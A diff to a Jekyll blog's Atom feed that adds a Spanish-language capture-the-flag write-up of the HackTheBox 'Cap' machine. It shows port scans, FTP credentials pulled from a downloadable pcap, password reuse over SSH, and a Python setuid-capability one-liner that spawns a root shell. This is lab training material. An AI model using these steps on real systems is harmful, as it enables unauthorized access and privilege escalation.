@@ -1,4 +1,198 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-03T21:23:48-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">B0ySie7e</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>B0Y-SIE7E</name></author><entry><title type="html">Mustacchio- Tryhackme</title><link href="http://localhost:4000/thm-Mustacchio/" rel="alternate" type="text/html" title="Mustacchio- Tryhackme" /><published>2021-09-04T00:00:00-04:00</published><updated>2021-09-04T00:00:00-04:00</updated><id>http://localhost:4000/thm-Mustacchio</id><content type="html" xml:base="http://localhost:4000/thm-Mustacchio/">&lt;h4 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h4&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-05T22:24:50-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">B0ySie7e</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>B0Y-SIE7E</name></author><entry><title type="html">CAP-hackthebox</title><link href="http://localhost:4000/HTB-CAP/" rel="alternate" type="text/html" title="CAP-hackthebox" /><published>2021-10-02T00:00:00-04:00</published><updated>2021-10-02T00:00:00-04:00</updated><id>http://localhost:4000/HTB-CAP</id><content type="html" xml:base="http://localhost:4000/HTB-CAP/">&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;FASE DE RECONOCIMIENTO&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Uno de las principales fases y importantes es la de reconocimiento una vez obtenida la direccion ip de la victima, para ello podemos usar diversas herramientas que permitan el escane de puertos que podemos encontra en internet, en lo personal usare la herramienta nmap.&lt;/p&gt;
+
+    &lt;p&gt;Normalmente yo guardo en un archivo “allportsScan.nmap” las evidencias sobre los escaneos para volver a revisar si asi lo requiero en en futuro.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &amp;lt;IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allportsScan.nmap
+  &lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Sun Aug 15 19:53:22 2021 as: nmap -p- --open --min-rate 5000 -Pn -vvv -oG allportsScan &amp;lt;IP&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)&lt;/span&gt;
+  Host: cap.htb &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;   Status: Up
+  Host: cap.htb &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;   Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///
+  &lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Aug 15 19:54:03 2021 -- 1 IP address (1 host up) scanned in 40.61 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos que  tenemos 3 puertos abiertos
+    &lt;ul&gt;
+      &lt;li&gt;21 que es usado para el servicio &lt;a href=&quot;https://blog.infranetworking.com/servidor-ftp/&quot;&gt;FTP&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;22 que se usa para el servicio de &lt;a href=&quot;https://mundo-hackers.weebly.com/servicio-ssh.html&quot;&gt;SSH&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;80 que se usa para el servicio &lt;a href=&quot;https://www.pickaweb.es/ayuda/que-es-http/&quot;&gt;web(http)&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;una vez ya conocidos los púertos y los servicios vamos a ver a mas detalle cada servicio y sus caracteristicas.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,80 &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; servicesScan cap.htb
+  &lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Sun Aug 15 19:56:06 2021 as: nmap -p21,22,80 -sC -sS -vvv -oN servicesScan cap.htb&lt;/span&gt;
+  Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cap.htb
+  Host is up, received echo-reply ttl 63 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.35s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  Scanned at 2021-08-15 19:56:06 EDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;33s
+
+  PORT   STATE SERVICE REASON
+  21/tcp open  ftp     syn-ack ttl 63
+  22/tcp open  ssh     syn-ack ttl 63
+  | ssh-hostkey: 
+  |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+  |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+  |   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
+  80/tcp open  http    syn-ack ttl 63
+  | http-methods: 
+  |_  Supported Methods: GET HEAD OPTIONS
+  |_http-title: Security Dashboard
+
+  Read data files from: /usr/bin/../share/nmap
+  &lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Aug 15 19:56:39 2021 -- 1 IP address (1 host up) scanned in 33.54 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;En principio no vemos nada raro, ni algo que nos llame la atención.
+vamos a revisar el sitio web:&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;En el sitio web observamos una ruta en la que podemos descargar algunos archivos: http://cap.htb/dat/0&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;center&gt;
+    &lt;a href=&quot;https://ibb.co/KWTXfW0&quot;&gt;&lt;img src=&quot;https://i.ibb.co/YhH31hR/web-cap.png&quot; alt=&quot;web-cap&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vemos que podemos descargar archivos &quot;.pcap&quot;, estos archivos son paquetes de red en las cuales se capturaron y muchas veces puden capturar informacion como usuarios y contraseñas.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;wireshark---ftp&quot;&gt;WIRESHARK - FTP&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;vamos abrir el “0.pcap” con wireshark
+    &lt;center&gt;
+&lt;a href=&quot;https://ibb.co/jJWvTvP&quot;&gt;&lt;img src=&quot;https://i.ibb.co/tLxM4MT/wireshark-cap.png&quot; alt=&quot;wireshark-cap&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+
+    &lt;p&gt;Observamos que tenemos las un usuario una contraseña, y el servicio en las cuales se usaron es FTP por lo que vamos a probar a conectarnos por ftp&lt;/p&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp cap.htb
+  Connected to cap.htb.
+  220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cap.htb:kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: nathan
+  331 Please specify the password.
+  Password:
+  230 Login successful.
+  Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
+  Using binary mode to transfer files.
+  ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+  &lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
+  150 Here comes the directory listing.
+  &lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;    1 1001     1001           33 Oct 04 09:04 user.txt
+  226 Directory send OK.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Ingresamos con éxito, ahora enuramos un poco y nos encontramos con  un archivo “user.txt” donde veremos la flag. Nos lo descargamos a nuestra equipo.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ftp&amp;gt; get user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;servicio-ssh---escalar-privilegios&quot;&gt;SERVICIO SSH - Escalar privilegios&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;¿Ahora? No sabemos por donde ir, pero tenemos credenciales las cuanles podemos probar en el servicio SSH y es posible que se esten reuzando las credenciales.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh nathan@cap.htb
+  nathan@cap.htb&lt;span class=&quot;s1&quot;&gt;'s password: 
+  Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+  * Documentation:  https://help.ubuntu.com
+  * Management:     https://landscape.canonical.com
+  * Support:        https://ubuntu.com/advantage
+
+    System information as of Tue Oct  5 04:39:22 UTC 2021
+
+    System load:  0.0               Processes:             226
+    Usage of /:   37.1% of 8.73GB   Users logged in:       0
+    Memory usage: 34%               IPv4 address for eth0: cap.htb
+    Swap usage:   0%
+
+    =&amp;gt; There are 4 zombie processes.
+
+
+  63 updates can be applied immediately.
+  42 of these updates are standard security updates.
+  To see these additional updates run: apt list --upgradable
+
+
+  The list of available updates is more than a week old.
+  To check for new updates run: sudo apt update
+  Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+  Last login: Tue Oct  5 04:38:36 2021 from 10.10.16.4
+  nathan@cap:~$ 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Una vez ganado acceso a la maquina podemos enumerar para hacernos usuarios privilegiados, enumerando las siguientes cosas:
+    &lt;ul&gt;
+      &lt;li&gt;Archivos o binarios que podemos ejecutar.&lt;/li&gt;
+      &lt;li&gt;Tareas que esta programadas en el sistema que se ejecutar cada determinado tiempo.&lt;/li&gt;
+      &lt;li&gt;Listar los permisos que tenemos de los archivos /etc/passwd, /etc/shadow.&lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;Mas maneras de enumerar el sistema &lt;a href=&quot;https://byte-mind.net/enumeracion-y-escalado-de-privilegios-en-linux/&quot;&gt;byte-mind.net&lt;/a&gt;&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;En fin hay una variedad de maneras de enumerar, incluso podemos a recurir a herramientas populares como LinEnum.sh que lo encuentras en github.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;En partticular nosotros vamos a enumerar por la &lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#list-capabilities&quot;&gt;capabilities&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  nathan@cap:/tmp/tmp.yoA7vt0g1R&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getcap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; / 2&amp;gt;/dev/null
+  /usr/bin/python3.8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_setuid,cap_net_bind_service+eip                                            
+  /usr/bin/ping &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep                                                                
+  /usr/bin/traceroute6.iputils &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep                                                        
+  /usr/bin/mtr-packet &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw +ep 
+  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_bind_service,cap_net_admin+ep   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos que una de las capabilities es de python3.8. si buscamos en &lt;a href=&quot;https://gtfobins.github.io/gtfobins/python/#capabilities&quot;&gt;gtfobins.github.io&lt;/a&gt; tenemos como migrar al usuario root.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Capabilities
+  If the binary has the Linux CAP_SETUID capability &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;or it is executed by another binary with the capability &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
+
+  &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;which python&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;setcap cap_setuid+ep python
+
+  ./python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Entonces lo que vamos hacer es seguir la guia(comando)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  nathan@cap:/tmp/tmp.yoA7vt0g1R&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3.8 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# whoami &lt;/span&gt;
+  root
+  &lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Bingo somos usuario root.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;</content><author><name>B0Y-SIE7E</name></author><category term="hackthebox" /><category term="linux" /><category term="write up" /><category term="cap" /><category term="easy" /><summary type="html">Maquina CAP, de nivel easy catalogada por la comunidad. Esta maquina va bien para principiantes</summary></entry><entry><title type="html">Mustacchio- Tryhackme</title><link href="http://localhost:4000/thm-Mustacchio/" rel="alternate" type="text/html" title="Mustacchio- Tryhackme" /><published>2021-09-04T00:00:00-04:00</published><updated>2021-09-04T00:00:00-04:00</updated><id>http://localhost:4000/thm-Mustacchio</id><content type="html" xml:base="http://localhost:4000/thm-Mustacchio/">&lt;h4 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h4&gt;
 &lt;ul&gt;
   &lt;li&gt;Usamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS --min-rate 5000&lt;/code&gt; para ir mucho mas rapido con el escaneo, luego lo guardaremos en el archivo allportsScan. Luego del escaneo se tendra el siguiente resultado.&lt;/li&gt;
   &lt;li&gt;
